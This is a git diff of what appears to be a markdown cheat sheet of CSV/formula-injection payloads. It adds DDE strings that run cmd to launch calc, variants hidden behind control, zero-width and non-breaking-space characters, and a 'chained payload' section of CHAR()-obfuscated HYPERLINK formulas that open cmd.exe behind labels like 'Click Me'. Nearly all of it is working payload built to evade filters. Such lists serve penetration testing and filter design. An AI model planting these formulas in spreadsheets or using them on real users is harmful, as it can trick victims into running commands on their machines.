@@ -84,8 +84,9 @@ parsebreaker",=cmd|'/C notepad'!'A1''" ;,=cmd|'/C notepad'!'A2'
 \t--1-cmd|'/C calc'!'A1'
 \"--1-cmd|'/C calc'!'A1'
 \n--4-cmd|'/C calc'!'A1'
-<TAB>=cmd|'/C notepad'!'A1' 
-<CR>=cmd|'/C notepad'!'A1'
+\r=cmd|' /C calc'!A1
+\0=cmd|' /C calc'!A1
+\r\",;=cmd|' /C calc'!A1
 ```
 
 ---
@@ -94,6 +95,8 @@ parsebreaker",=cmd|'/C notepad'!'A1''" ;,=cmd|'/C notepad'!'A2'
 
 ```csv
 \u200B=cmd|' /C calc'!A0
+\u00A0=cmd|' /C calc'!A1
+\u200B=cmd|' /C calc'!A1
 ```
 
 ---
@@ -131,13 +134,24 @@ file:///C:/Windows/System32/calc.exe
 
 ```csv
 @HYPERLINK(CHAR(102)&CHAR(105)&CHAR(108)&CHAR(101)&CHAR(58)&CHAR(47)&CHAR(47)&CHAR(67)&CHAR(58)&CHAR(47)&CHAR(87)&CHAR(105)&CHAR(110)&CHAR(100)&CHAR(111)&CHAR(119)&CHAR(115)&CHAR(47)&CHAR(83)&CHAR(121)&CHAR(115)&CHAR(116)&CHAR(101)&CHAR(109)&CHAR(51)&CHAR(50)&CHAR(47)&CHAR(110)&CHAR(111)&CHAR(116)&CHAR(101)&CHAR(112)&CHAR(97)&CHAR(100)&CHAR(46)&CHAR(101)&CHAR(120)&CHAR(101))
+
 @HYPERLINK("file:///C:/Windows/"&CHAR(83)&"ystem32/cmd.exe")
+
 @HYPERLINK("file:///C:"&CHAR(47)&"Windows"&CHAR(47)&"System32"&CHAR(47)&"cmd.exe")
+
 @WEBSERVICE(CHAR(104)&CHAR(116)&CHAR(116)&CHAR(112)&CHAR(115)&CHAR(58)&CHAR(47)&CHAR(47)&CHAR(119)&CHAR(119)&CHAR(119)&CHAR(46)&CHAR(103)&CHAR(111)&CHAR(111)&CHAR(103)&CHAR(108)&CHAR(101)&CHAR(46)&CHAR(99)&CHAR(111)&CHAR(109))
+```
+
+### chained payload
+```csv
 =HYPERLINK(CONCAT(CHAR(102),CHAR(105),CHAR(108),CHAR(101),CHAR(58),CHAR(47),CHAR(47),CHAR(47),CHAR(67),CHAR(58),CHAR(47),CHAR(87),CHAR(105),CHAR(110),CHAR(100),CHAR(111),CHAR(119),CHAR(115),CHAR(47),CHAR(83),CHAR(121),CHAR(115),CHAR(116),CHAR(101),CHAR(109),CHAR(51),CHAR(50),CHAR(47),CHAR(99),CHAR(109),CHAR(100),CHAR(46),CHAR(101),CHAR(120),CHAR(101)),"Open Command Prompt")
 =T(CHAR(102)&CHAR(105)&CHAR(108)&CHAR(101)&CHAR(58)&CHAR(47)&CHAR(47)&CHAR(47)&CHAR(67)&CHAR(58)&CHAR(47)&CHAR(87)&CHAR(105)&CHAR(110)&CHAR(100)&CHAR(111)&CHAR(119)&CHAR(115)&CHAR(47)&CHAR(83)&CHAR(121)&CHAR(115)&CHAR(116)&CHAR(101)&CHAR(109)&CHAR(51)&CHAR(50)&CHAR(47)&CHAR(99)&CHAR(109)&CHAR(100)&CHAR(46)&CHAR(101)&CHAR(120)&CHAR(101))
+
 =HYPERLINK(G2,"Click Me")
 ```
+
+#### example of a multi chained csv on multiple cells
+![csvi-chained-example](images-examples/chained-csvi-example.png.png)
 
 ---
 
@@ -180,5 +194,3 @@ cmd|'/C calc'!A0,?
 
 ---
 
-## example of a multi chained csv on multiple cells
-![image.png](attachment:db3b9314-02f1-4e79-ba80-c40a85dbb413:image.png)
